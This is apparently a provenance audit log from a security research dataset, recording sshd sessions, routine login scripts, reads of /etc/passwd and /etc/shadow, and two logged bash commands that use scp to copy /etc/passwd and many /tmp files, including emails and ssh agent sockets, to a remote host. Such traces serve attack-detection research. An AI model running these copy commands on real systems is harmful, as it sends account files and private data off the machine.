1557755351.278:1243580438,1F9E35CC-1019-5D22-FEFC-BA55BF69EAF7:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755351.278:1243580432,1F9E35CC-1019-5D22-FEFC-BA55BF69EAF7:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755351.278:1243580412,88E769CA-E56A-04DE-D8E6-7B600000F14F:sshd,CHANGE_PRINCIPAL,402411A1-8288-E4EA-9F6A-9755092E5BD0,sshd,null
1557755351.278:1243580390,43212AC1-5D15-2E23-77AE-F14E4E2ABB26:sshd,CHANGE_PRINCIPAL,88E769CA-E56A-04DE-D8E6-7B600000F14F,sshd,null
1557755351.278:1243580387,1F9E35CC-1019-5D22-FEFC-BA55BF69EAF7:sshd,FORK,43212AC1-5D15-2E23-77AE-F14E4E2ABB26,sshd,null
1557755351.278:1243580378,1F9E35CC-1019-5D22-FEFC-BA55BF69EAF7:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755351.278:1243580342,1F9E35CC-1019-5D22-FEFC-BA55BF69EAF7:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755351.278:1243580339,1F9E35CC-1019-5D22-FEFC-BA55BF69EAF7:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755351.278:1243580336,1F9E35CC-1019-5D22-FEFC-BA55BF69EAF7:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755351.230:1243578268,DEAE1116-C8F2-4A96-AA28-29276194E6FB:lsb_release,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755351.218:1243578028,7AD18C25-630F-6D83-E478-AB08E374743A:91-release-upgr,EXECUTE,DEAE1116-C8F2-4A96-AA28-29276194E6FB,lsb_release,null
1557755351.218:1243578019,19C6B60A-8602-8600-2E95-D5EB0387A060:91-release-upgr,FORK,7AD18C25-630F-6D83-E478-AB08E374743A,91-release-upgr,null
1557755351.218:1243578012,E5919FC8-C966-CED8-8338-C2B912D515A9:91-release-upgr,FORK,19C6B60A-8602-8600-2E95-D5EB0387A060,91-release-upgr,null
1557755351.218:1243577990,29A8267F-E1EA-0BAC-8F5A-F924BBB00BE2:run-parts,EXECUTE,E5919FC8-C966-CED8-8338-C2B912D515A9,91-release-upgr,null
1557755351.218:1243577989,D6DA0ED2-B851-A3F5-60AE-28184CA43679:run-parts,FORK,29A8267F-E1EA-0BAC-8F5A-F924BBB00BE2,run-parts,null
1557755351.074:1243569829,1F9A7835-E3BF-9E1B-1A6A-D21A1A54FA77:landscape-sysin,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755351.062:1243569431,81592D7C-A868-8310-BCBE-6CBF69B8A63D:50-landscape-sy,EXECUTE,1F9A7835-E3BF-9E1B-1A6A-D21A1A54FA77,landscape-sysin,null
1557755351.062:1243569429,E0388A02-1309-3393-55F4-5E768732518B:50-landscape-sy,FORK,81592D7C-A868-8310-BCBE-6CBF69B8A63D,50-landscape-sy,null
1557755351.054:1243569184,49C01D90-74AE-AA6F-A4E3-074A05D465A4:run-parts,EXECUTE,E0388A02-1309-3393-55F4-5E768732518B,50-landscape-sy,null
1557755351.054:1243569180,D6DA0ED2-B851-A3F5-60AE-28184CA43679:run-parts,FORK,49C01D90-74AE-AA6F-A4E3-074A05D465A4,run-parts,null
1557755351.042:1243568862,7BA8AA96-53D5-98BD-B8EF-27B6C367193D:env,EXECUTE,D6DA0ED2-B851-A3F5-60AE-28184CA43679,run-parts,null
1557755351.042:1243568841,5A3A61AD-05EA-B547-C876-898A14879A8C:sh,EXECUTE,7BA8AA96-53D5-98BD-B8EF-27B6C367193D,env,null
1557755351.042:1243568840,07C1F45F-875A-9F97-4ED7-7311203D5EA6:sh,FORK,5A3A61AD-05EA-B547-C876-898A14879A8C,sh,null
1557755351.038:1243568812,D39E2A4A-D982-7A3F-919B-959B68D80AD0:sshd,EXECUTE,07C1F45F-875A-9F97-4ED7-7311203D5EA6,sh,null
1557755351.038:1243568705,1F9E35CC-1019-5D22-FEFC-BA55BF69EAF7:sshd,FORK,D39E2A4A-D982-7A3F-919B-959B68D80AD0,sshd,null
1557755351.038:1243568683,1F9E35CC-1019-5D22-FEFC-BA55BF69EAF7:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755351.006:1243568348,1F9E35CC-1019-5D22-FEFC-BA55BF69EAF7:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755351.006:1243568297,1F9E35CC-1019-5D22-FEFC-BA55BF69EAF7:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755351.006:1243568285,017180A4-A730-2DF1-4CDA-654D2E62FBDB:sshd,CHANGE_PRINCIPAL,1F9E35CC-1019-5D22-FEFC-BA55BF69EAF7,sshd,null
1557755351.006:1243568284,42E1E0FE-7C36-859F-ED57-2002FEA618DE:sshd,CHANGE_PRINCIPAL,017180A4-A730-2DF1-4CDA-654D2E62FBDB,sshd,null
1557755351.006:1243568283,017180A4-A730-2DF1-4CDA-654D2E62FBDB:sshd,CHANGE_PRINCIPAL,42E1E0FE-7C36-859F-ED57-2002FEA618DE,sshd,null
1557755351.006:1243568282,1F9E35CC-1019-5D22-FEFC-BA55BF69EAF7:sshd,CHANGE_PRINCIPAL,017180A4-A730-2DF1-4CDA-654D2E62FBDB,sshd,null
1557755351.006:1243568280,1F9E35CC-1019-5D22-FEFC-BA55BF69EAF7:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755351.006:1243568266,1F9E35CC-1019-5D22-FEFC-BA55BF69EAF7:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755351.002:1243568226,1F9E35CC-1019-5D22-FEFC-BA55BF69EAF7:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1557755351.002:1243568223,1F9E35CC-1019-5D22-FEFC-BA55BF69EAF7:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755350.990:1243568198,1F9E35CC-1019-5D22-FEFC-BA55BF69EAF7:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1557755350.990:1243568195,1F9E35CC-1019-5D22-FEFC-BA55BF69EAF7:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755350.886:1243567972,1F9E35CC-1019-5D22-FEFC-BA55BF69EAF7:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755350.886:1243567940,1F9E35CC-1019-5D22-FEFC-BA55BF69EAF7:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1557755350.886:1243567939,1F9E35CC-1019-5D22-FEFC-BA55BF69EAF7:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1557755350.786:1243567725,1F9E35CC-1019-5D22-FEFC-BA55BF69EAF7:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755350.778:1243567469,41135179-E239-8DC7-C400-2E146D99CB55:sshd,EXECUTE,1F9E35CC-1019-5D22-FEFC-BA55BF69EAF7,sshd,null
1557755350.778:1243567448,3E8119A1-F9B4-0931-53D3-3FF11EEA5228:sshd,FORK,41135179-E239-8DC7-C400-2E146D99CB55,sshd,null
1557755299.630:1243545110,97842526-F68B-18D6-97A2-F2A93C411D99:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755299.630:1243545054,97842526-F68B-18D6-97A2-F2A93C411D99:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755299.626:1243544950,DD16C4CC-B991-5DD3-1AFF-9C7A37841A5B:sshd,CHANGE_PRINCIPAL,97842526-F68B-18D6-97A2-F2A93C411D99,sshd,null
1557755299.626:1243544949,DD16C4CC-B991-5DD3-1AFF-9C7A37841A5B:sshd,CHANGE_PRINCIPAL,DD16C4CC-B991-5DD3-1AFF-9C7A37841A5B,sshd,null
1557755299.626:1243544948,97842526-F68B-18D6-97A2-F2A93C411D99:sshd,CHANGE_PRINCIPAL,DD16C4CC-B991-5DD3-1AFF-9C7A37841A5B,sshd,null
1557755294.990:1243543252,D8A7367E-57F5-65BD-C9A6-8C1F44EE08EC:ssh,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755294.990:1243543249,D8A7367E-57F5-65BD-C9A6-8C1F44EE08EC:ssh,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755294.990:1243543246,D8A7367E-57F5-65BD-C9A6-8C1F44EE08EC:ssh,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755294.990:1243543243,D8A7367E-57F5-65BD-C9A6-8C1F44EE08EC:ssh,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755294.990:1243543240,D8A7367E-57F5-65BD-C9A6-8C1F44EE08EC:ssh,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755294.990:1243543237,D8A7367E-57F5-65BD-C9A6-8C1F44EE08EC:ssh,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755294.990:1243543234,D8A7367E-57F5-65BD-C9A6-8C1F44EE08EC:ssh,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755294.986:1243543212,D8A7367E-57F5-65BD-C9A6-8C1F44EE08EC:ssh,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755294.982:1243543117,F8610CA8-8B2F-1FAD-A468-911E830D9154:scp,EXECUTE,D8A7367E-57F5-65BD-C9A6-8C1F44EE08EC,ssh,null
1557755294.982:1243543108,2905C4B7-37E4-B660-6849-F31A111D0717:scp,FORK,F8610CA8-8B2F-1FAD-A468-911E830D9154,scp,null
1557755294.982:1243543101,2905C4B7-37E4-B660-6849-F31A111D0717:scp,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755294.982:1243543040,BF8B9107-0DC1-5FB1-397B-DD831550AF16:bash,EXECUTE,2905C4B7-37E4-B660-6849-F31A111D0717,b'scp -r /etc/passwd admin@128.55.12.111:./docs/',null
1557755294.982:1243543034,57C8A0C2-2059-D8B8-A9A6-A7D58C80086F:bash,FORK,BF8B9107-0DC1-5FB1-397B-DD831550AF16,bash,null
1557755292.222:1243531201,A21CBB51-F0BF-7A78-1A6C-A1CF40A5FDC5:ssh,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755292.222:1243531198,A21CBB51-F0BF-7A78-1A6C-A1CF40A5FDC5:ssh,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755292.222:1243531195,A21CBB51-F0BF-7A78-1A6C-A1CF40A5FDC5:ssh,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755292.222:1243531192,A21CBB51-F0BF-7A78-1A6C-A1CF40A5FDC5:ssh,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755292.222:1243531189,A21CBB51-F0BF-7A78-1A6C-A1CF40A5FDC5:ssh,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755292.222:1243531186,A21CBB51-F0BF-7A78-1A6C-A1CF40A5FDC5:ssh,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755292.222:1243531183,A21CBB51-F0BF-7A78-1A6C-A1CF40A5FDC5:ssh,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755292.218:1243531161,A21CBB51-F0BF-7A78-1A6C-A1CF40A5FDC5:ssh,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755292.214:1243531066,1E5F1FD7-1409-E4AC-4F86-6D0582D08A2C:scp,EXECUTE,A21CBB51-F0BF-7A78-1A6C-A1CF40A5FDC5,ssh,null
1557755292.214:1243531057,25636AB3-A6A3-E591-B71A-67C7F07871F5:scp,FORK,1E5F1FD7-1409-E4AC-4F86-6D0582D08A2C,scp,null
1557755292.214:1243531050,25636AB3-A6A3-E591-B71A-67C7F07871F5:scp,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755292.214:1243530989,12806C68-9554-F6A6-1EF5-179BFB25A7F0:bash,EXECUTE,25636AB3-A6A3-E591-B71A-67C7F07871F5,b'scp -r /tmp/arthrosporic /tmp/athleticism /tmp/cerebroganglion /tmp/dyking /tmp/filosus /tmp/firefox_admin /tmp/glassite /tmp/grains /tmp/have /tmp/hsperfdata_darpa /tmp/hydrocharitaceous /tmp/intermelt /tmp/kowtowing /tmp/limpiness /tmp/loverless /tmp/mampus /tmp/mnemonics /tmp/mozilla_admin0 /tmp/natally /tmp/nscopy.tmp /tmp/nsemail-100.eml /tmp/nsemail-10.eml /tmp/nsemail-11.eml /tmp/nsemail-12.eml /tmp/nsemail-13.eml /tmp/nsemail-14.eml /tmp/nsemail-15.eml /tmp/nsemail-16.eml /tmp/nsemail-17.eml /tmp/nsemail-18.eml /tmp/nsemail-19.eml /tmp/nsemail-1.eml /tmp/nsemail-20.eml /tmp/nsemail-21.eml /tmp/nsemail-22.eml /tmp/nsemail-23.eml /tmp/nsemail-24.eml /tmp/nsemail-25.eml /tmp/nsemail-26.eml /tmp/nsemail-27.eml /tmp/nsemail-28.eml /tmp/nsemail-29.eml /tmp/nsemail-2.eml /tmp/nsemail-30.eml /tmp/nsemail-31.eml /tmp/nsemail-32.eml /tmp/nsemail-33.eml /tmp/nsemail-34.eml /tmp/nsemail-35.eml /tmp/nsemail-36.eml /tmp/nsemail-37.eml /tmp/nsemail-38.eml /tmp/nsemail-39.eml /tmp/nsemail-3.eml /tmp/nsemail-40.eml /tmp/nsemail-41.eml /tmp/nsemail-42.eml /tmp/nsemail-43.eml /tmp/nsemail-44.eml /tmp/nsemail-45.eml /tmp/nsemail-46.eml /tmp/nsemail-47.eml /tmp/nsemail-48.eml /tmp/nsemail-49.eml /tmp/nsemail-4.eml /tmp/nsemail-50.eml /tmp/nsemail-51.eml /tmp/nsemail-52.eml /tmp/nsemail-53.eml /tmp/nsemail-54.eml /tmp/nsemail-55.eml /tmp/nsemail-56.eml /tmp/nsemail-57.eml /tmp/nsemail-58.eml /tmp/nsemail-59.eml /tmp/nsemail-5.eml /tmp/nsemail-60.eml /tmp/nsemail-61.eml /tmp/nsemail-62.eml /tmp/nsemail-63.eml /tmp/nsemail-64.eml /tmp/nsemail-65.eml /tmp/nsemail-66.eml /tmp/nsemail-67.eml /tmp/nsemail-68.eml /tmp/nsemail-69.eml /tmp/nsemail-6.eml /tmp/nsemail-70.eml /tmp/nsemail-71.eml /tmp/nsemail-72.eml /tmp/nsemail-73.eml /tmp/nsemail-74.eml /tmp/nsemail-75.eml /tmp/nsemail-76.eml /tmp/nsemail-77.eml /tmp/nsemail-78.eml /tmp/nsemail-79.eml /tmp/nsemail-7.eml /tmp/nsemail-80.eml /tmp/nsemail-81.eml /tmp/nsemail-82.eml /tmp/nsemail-83.eml /tmp/nsemail-84.eml /tmp/nsemail-85.eml /tmp/nsemail-86.eml /tmp/nsemail-87.eml /tmp/nsemail-88.eml /tmp/nsemail-89.eml /tmp/nsemail-8.eml /tmp/nsemail-90.eml /tmp/nsemail-91.eml /tmp/nsemail-92.eml /tmp/nsemail-93.eml /tmp/nsemail-94.eml /tmp/nsemail-95.eml /tmp/nsemail-96.eml /tmp/nsemail-97.eml /tmp/nsemail-98.eml /tmp/nsemail-99.eml /tmp/nsemail-9.eml /tmp/nsemail.eml /tmp/nsemail.html /tmp/nsmail.tmp /tmp/overmeticulousness /tmp/promethazine /tmp/sabbathless /tmp/ssh-fN7CqnTAo346 /tmp/ssh-xR9xVWh22iC3 /tmp/subaggregation /tmp/thakur /tmp/transmarginal /tmp/tristichous /tmp/undunged /tmp/unengraven /tmp/unfrugality /tmp/uninflicted /tmp/urgentness admin@128.55.12.111:./backup/',null
1557755292.214:1243530983,57C8A0C2-2059-D8B8-A9A6-A7D58C80086F:bash,FORK,12806C68-9554-F6A6-1EF5-179BFB25A7F0,bash,null
1557755292.038:1243528157,57C8A0C2-2059-D8B8-A9A6-A7D58C80086F:bash,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755292.034:1243528074,6467E47A-37AF-6B96-563E-6144DB852FE9:sshd,EXECUTE,57C8A0C2-2059-D8B8-A9A6-A7D58C80086F,bash,null
1557755292.034:1243527954,8009304D-1E75-6EE0-68D7-EF20FE822301:sshd,FORK,6467E47A-37AF-6B96-563E-6144DB852FE9,sshd,null
1557755292.034:1243527907,97842526-F68B-18D6-97A2-F2A93C411D99:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755292.034:1243527901,97842526-F68B-18D6-97A2-F2A93C411D99:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755292.034:1243527881,875710F3-2467-2BFC-A209-AB4A5E559DA4:sshd,CHANGE_PRINCIPAL,8009304D-1E75-6EE0-68D7-EF20FE822301,sshd,null
1557755292.034:1243527859,9AF94E45-0203-6B30-ED45-2646389B4831:sshd,CHANGE_PRINCIPAL,875710F3-2467-2BFC-A209-AB4A5E559DA4,sshd,null
1557755292.034:1243527856,97842526-F68B-18D6-97A2-F2A93C411D99:sshd,FORK,9AF94E45-0203-6B30-ED45-2646389B4831,sshd,null
1557755292.034:1243527847,97842526-F68B-18D6-97A2-F2A93C411D99:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755292.034:1243527811,97842526-F68B-18D6-97A2-F2A93C411D99:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755292.034:1243527808,97842526-F68B-18D6-97A2-F2A93C411D99:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755292.034:1243527805,97842526-F68B-18D6-97A2-F2A93C411D99:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755291.986:1243525729,EA011D43-5944-E951-7C0F-FCBD2BD119F6:lsb_release,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755291.978:1243525489,84FBE472-7DEC-FC89-6ECD-E03CA51F79DB:91-release-upgr,EXECUTE,EA011D43-5944-E951-7C0F-FCBD2BD119F6,lsb_release,null
1557755291.978:1243525480,DF0900FF-2B97-0235-BCB8-0D3AA67AFF79:91-release-upgr,FORK,84FBE472-7DEC-FC89-6ECD-E03CA51F79DB,91-release-upgr,null
1557755291.978:1243525473,1D50522F-FA2C-BEE2-DCD8-BA7539A42217:91-release-upgr,FORK,DF0900FF-2B97-0235-BCB8-0D3AA67AFF79,91-release-upgr,null
1557755291.978:1243525451,3F5BA562-D598-8BD5-4A1D-6F2C44383E86:run-parts,EXECUTE,1D50522F-FA2C-BEE2-DCD8-BA7539A42217,91-release-upgr,null
1557755291.978:1243525450,0F118A11-DE62-9FDD-79EE-862CD685009A:run-parts,FORK,3F5BA562-D598-8BD5-4A1D-6F2C44383E86,run-parts,null
1557755291.830:1243517331,3544FA8F-F513-3123-B228-6F99288165B6:landscape-sysin,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755291.826:1243516938,B538DA2B-61D2-5A34-CCD6-DC2B0B4BED78:50-landscape-sy,EXECUTE,3544FA8F-F513-3123-B228-6F99288165B6,landscape-sysin,null
1557755291.826:1243516936,40E07C55-10E8-A068-68DA-5A57AAE49325:50-landscape-sy,FORK,B538DA2B-61D2-5A34-CCD6-DC2B0B4BED78,50-landscape-sy,null
1557755291.822:1243516667,1A0CBD27-F44D-3A32-FA84-E0A990B62945:run-parts,EXECUTE,40E07C55-10E8-A068-68DA-5A57AAE49325,50-landscape-sy,null
1557755291.822:1243516665,0F118A11-DE62-9FDD-79EE-862CD685009A:run-parts,FORK,1A0CBD27-F44D-3A32-FA84-E0A990B62945,run-parts,null
1557755291.814:1243516341,5F67A78F-0ED3-B64B-D5CE-A6BCFAE20F7E:env,EXECUTE,0F118A11-DE62-9FDD-79EE-862CD685009A,run-parts,null
1557755291.814:1243516316,A932790C-2E25-F7B4-72E0-918528A72537:sh,EXECUTE,5F67A78F-0ED3-B64B-D5CE-A6BCFAE20F7E,env,null
1557755291.814:1243516302,7E271645-268A-EABE-7119-3EEC5D58E16E:sh,FORK,A932790C-2E25-F7B4-72E0-918528A72537,sh,null
1557755291.814:1243516247,E97B6FC0-3ECC-73B6-6747-66F1E104767A:sshd,EXECUTE,7E271645-268A-EABE-7119-3EEC5D58E16E,sh,null
1557755291.814:1243516214,97842526-F68B-18D6-97A2-F2A93C411D99:sshd,FORK,E97B6FC0-3ECC-73B6-6747-66F1E104767A,sshd,null
1557755291.814:1243516186,97842526-F68B-18D6-97A2-F2A93C411D99:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755291.778:1243515832,97842526-F68B-18D6-97A2-F2A93C411D99:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755291.778:1243515781,97842526-F68B-18D6-97A2-F2A93C411D99:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755291.778:1243515769,02AD38F8-72C1-9F83-0F5A-AF35CE8E10CD:sshd,CHANGE_PRINCIPAL,97842526-F68B-18D6-97A2-F2A93C411D99,sshd,null
1557755291.778:1243515768,F6893EEB-6D06-4AC7-6689-91EC465EE0AD:sshd,CHANGE_PRINCIPAL,02AD38F8-72C1-9F83-0F5A-AF35CE8E10CD,sshd,null
1557755291.778:1243515767,02AD38F8-72C1-9F83-0F5A-AF35CE8E10CD:sshd,CHANGE_PRINCIPAL,F6893EEB-6D06-4AC7-6689-91EC465EE0AD,sshd,null
1557755291.778:1243515766,97842526-F68B-18D6-97A2-F2A93C411D99:sshd,CHANGE_PRINCIPAL,02AD38F8-72C1-9F83-0F5A-AF35CE8E10CD,sshd,null
1557755291.778:1243515764,97842526-F68B-18D6-97A2-F2A93C411D99:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755291.778:1243515750,97842526-F68B-18D6-97A2-F2A93C411D99:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755291.778:1243515710,97842526-F68B-18D6-97A2-F2A93C411D99:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1557755291.778:1243515707,97842526-F68B-18D6-97A2-F2A93C411D99:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755291.770:1243515682,97842526-F68B-18D6-97A2-F2A93C411D99:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1557755291.770:1243515679,97842526-F68B-18D6-97A2-F2A93C411D99:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755291.666:1243515456,97842526-F68B-18D6-97A2-F2A93C411D99:sshd,MMAP,4B767AD6-3935-ED43-8303-71B64C61A39B,/etc/passwd,null
1557755291.666:1243515424,97842526-F68B-18D6-97A2-F2A93C411D99:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1557755291.666:1243515423,97842526-F68B-18D6-97A2-F2A93C411D99:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
